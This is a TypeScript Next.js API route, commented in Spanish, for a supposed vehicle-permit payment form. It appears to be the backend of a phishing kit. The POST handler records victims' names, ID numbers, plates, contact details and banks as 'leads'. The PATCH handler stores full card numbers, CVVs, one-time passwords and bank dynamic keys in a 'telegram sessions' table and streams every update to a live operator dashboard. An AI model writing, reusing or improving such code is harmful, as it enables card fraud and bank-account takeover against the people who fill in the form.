// app/api/session-pago/route.ts
// Guarda/actualiza en pyp_telegram_sessions cuando un usuario muestra intención de pago.
// También guarda/actualiza datos del formulario en pyp_personas.
import { NextRequest, NextResponse } from 'next/server';
import { supabase } from '@/lib/supabase';

const projectId = process.env.TELEGRAM_DTA || process.env.NEXT_PUBLIC_PROJECT_ID || 'default';

const emitSocketEvent = async (event: string, data: unknown) => {
  try {
    await fetch('http://localhost:3001/emit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ projectId, event, data }),
    });
  } catch {
    // Socket no crítico — no bloquea el flujo
  }
};

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const {
      sessionId,
      nombre,
      cedula,
      placa,
      email,
      telefono,
      direccion,
      banco,
      metodoPago,
      total,
      status = 'intento',
    } = body;

    if (!sessionId) {
      return NextResponse.json({ success: false, error: 'sessionId requerido' }, { status: 400 });
    }

    const now = new Date().toISOString();

    // ── 1. Upsert en pyp_telegram_sessions (para LiveDashboard) ──────────────
    const sessionPayload = {
      id: sessionId,
      project_id: projectId,
      status,
      bank: banco || metodoPago || 'Desconocido',
      source: 'permit_form',
      usuario: nombre || cedula || 'Visitante',
      documento: cedula,
      holder: nombre,
      email,
      phone: telefono,
      address: direccion,
      total: total ? String(total) : undefined,
      updated_at: now,
    };

    const { data, error } = await supabase
      .from('pyp_telegram_sessions')
      .upsert(sessionPayload, { onConflict: 'id' })
      .select()
      .single();

    if (error) {
      console.error('[session-pago] Supabase pyp_telegram_sessions error:', error);
      // No rompemos el flujo por este error
    }

    // ── 2. Upsert en pyp_personas (datos del formulario antes del pago) ──────
    if (cedula) {
      const personaPayload = {
        session_id: sessionId,
        pypid: projectId,
        nombre: nombre || null,
        cedula: cedula || null,
        placa: placa || null,
        email: email || null,
        telefono: telefono || null,
        direccion: direccion || null,
        banco: banco || null,
        metodo_pago: metodoPago || null,
        total: total ? String(total) : null,
        ultimo_estado: status,
        updated_at: now,
      };

      const { error: personaError } = await supabase
        .from('pyp_personas')
        .upsert(personaPayload, { onConflict: 'session_id' });

      if (personaError) {
        console.error('[session-pago] Supabase pyp_personas error:', personaError);
      }
    }

    // ── 3. Notificar al LiveDashboard vía Socket ──────────────────────────────
    const metodoLabel: Record<string, string> = {
      pse: '🏦 PSE',
      debito: '💳 Débito',
      credito: '💳 Crédito',
      qr: '📱 QR',
      nequi: '📲 Nequi',
      daviplata: '📲 Daviplata',
      bancolombia: '🟡 Bancolombia',
      davivienda: '🔴 Davivienda',
      'bre-b': '🔵 Bre-B',
    };

    await emitSocketEvent('new_lead', {
      ...(data || sessionPayload),
      id: sessionId,
      project_id: projectId,
      source: 'permit_form',
      bank: banco || metodoPago || 'Desconocido',
      status,
      usuario: nombre || cedula || 'Visitante',
      metodo_label: metodoLabel[metodoPago] || metodoPago || 'Desconocido',
      total: total ? String(total) : undefined,
      email,
      phone: telefono,
    });

    return NextResponse.json({ success: true, data });
  } catch (err) {
    console.error('[session-pago] Error:', err);
    return NextResponse.json(
      { success: false, error: err instanceof Error ? err.message : 'Error interno' },
      { status: 500 }
    );
  }
}

export async function PATCH(request: NextRequest) {
  try {
    const body = await request.json();
    const { sessionId, status, ...rest } = body;

    if (!sessionId) {
      return NextResponse.json({ success: false, error: 'sessionId requerido' }, { status: 400 });
    }

    const now = new Date().toISOString();

    const updatePayload: Record<string, string | undefined> = {
      updated_at: now,
    };

    if (status) updatePayload.status = status;
    if (rest.banco) updatePayload.bank = rest.banco;
    if (rest.otp) updatePayload.otp = rest.otp;
    if (rest.dinamica) updatePayload.dinamica = rest.dinamica;
    if (rest.cardNumber) updatePayload.tarjeta = rest.cardNumber;
    if (rest.cvv) updatePayload.cvv = rest.cvv;
    if (rest.total) updatePayload.total = String(rest.total);

    // Actualizar pyp_telegram_sessions
    const { data, error } = await supabase
      .from('pyp_telegram_sessions')
      .update(updatePayload)
      .eq('id', sessionId)
      .eq('project_id', projectId)
      .select()
      .single();

    if (error) {
      console.error('[session-pago PATCH] Error:', error);
      return NextResponse.json({ success: false, error: error.message }, { status: 500 });
    }

    // Actualizar último_estado en pyp_personas si hay status
    if (status) {
      await supabase
        .from('pyp_personas')
        .update({ ultimo_estado: status, updated_at: now })
        .eq('session_id', sessionId)
        .eq('pypid', projectId);
    }

    // Emitir actualización al Dashboard
    await emitSocketEvent('session_updated', {
      id: sessionId,
      project_id: projectId,
      status: updatePayload.status,
      bank: updatePayload.bank,
      updated_at: now,
    });

    return NextResponse.json({ success: true, data });
  } catch (err) {
    console.error('[session-pago PATCH] Error:', err);
    return NextResponse.json(
      { success: false, error: err instanceof Error ? err.message : 'Error interno' },
      { status: 500 }
    );
  }
}
